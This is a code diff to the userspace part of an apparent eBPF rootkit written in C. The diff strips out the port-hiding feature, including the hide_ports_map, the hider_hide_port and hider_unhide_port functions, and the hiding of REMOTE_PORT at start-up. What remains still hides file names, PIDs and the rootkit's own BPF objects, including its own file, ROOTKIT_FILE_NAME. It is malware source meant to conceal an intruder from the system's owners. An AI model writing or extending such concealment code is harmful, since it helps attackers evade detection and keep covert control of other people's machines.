@@ -8,22 +8,18 @@
 #include "config.h"
 #include "rootkit.skel.h"
 
-/* Private internal state storing all map FDs */
 static struct {
     struct rootkit *skel;
     int hide_names_map_fd;
-    int hide_ports_map_fd;
     int hide_bpf_map_fd;
     bool is_initialized;
 } g_hider = {
     .skel = NULL,
     .hide_names_map_fd = -1,
-    .hide_ports_map_fd = -1,
     .hide_bpf_map_fd = -1,
     .is_initialized = false,
 };
 
-/* Internal helper: zero-pads keys to match eBPF memory layout */
 static int update_string_map(int map_fd, const char *str_val)
 {
     if (!g_hider.is_initialized || map_fd < 0 || !str_val)
@@ -131,8 +127,6 @@ static int hide_bpf()
     return ret;
 }
 
-/* Public API Implementations */
-/* Bind all skeleton maps in one place */
 int hider_init(struct rootkit *skel)
 {
     if (!skel)
@@ -142,10 +136,6 @@ int hider_init(struct rootkit *skel)
 
     g_hider.hide_names_map_fd = bpf_map__fd(skel->maps.hide_names_map);
     if (g_hider.hide_names_map_fd < 0)
-        return -EINVAL;
-
-    g_hider.hide_ports_map_fd = bpf_map__fd(skel->maps.hide_ports_map);
-    if (g_hider.hide_ports_map_fd < 0)
         return -EINVAL;
 
     g_hider.hide_bpf_map_fd = bpf_map__fd(skel->maps.hide_bpf_ids_map);
@@ -172,15 +162,6 @@ int hider_hide_file(const char *filename)
     return update_string_map(g_hider.hide_names_map_fd, filename);
 }
 
-int hider_hide_port(uint16_t port)
-{
-    if (!g_hider.is_initialized || g_hider.hide_ports_map_fd < 0)
-        return -EINVAL;
-
-    uint8_t value = 1;
-    return bpf_map_update_elem(g_hider.hide_ports_map_fd, &port, &value, BPF_ANY);
-}
-
 int hider_unhide_pid(pid_t pid)
 {
     if (pid <= 0) 
@@ -195,14 +176,6 @@ int hider_unhide_pid(pid_t pid)
 int hider_unhide_file(const char *filename)
 {
     return delete_string_map(g_hider.hide_names_map_fd, filename);
-}
-
-int hider_unhide_port(uint16_t port)
-{
-    if (!g_hider.is_initialized || g_hider.hide_ports_map_fd < 0)
-        return -EINVAL;
-
-    return bpf_map_delete_elem(g_hider.hide_ports_map_fd, &port);
 }
 
 int hider_set_initial_hide_state()
@@ -226,10 +199,6 @@ int hider_set_initial_hide_state()
     }
 
     ret = hider_hide_file(ROOTKIT_FILE_NAME);
-    if (ret != 0)
-        return ret;
-
-    ret = hider_hide_port(REMOTE_PORT);
     if (ret != 0)
         return ret;
 
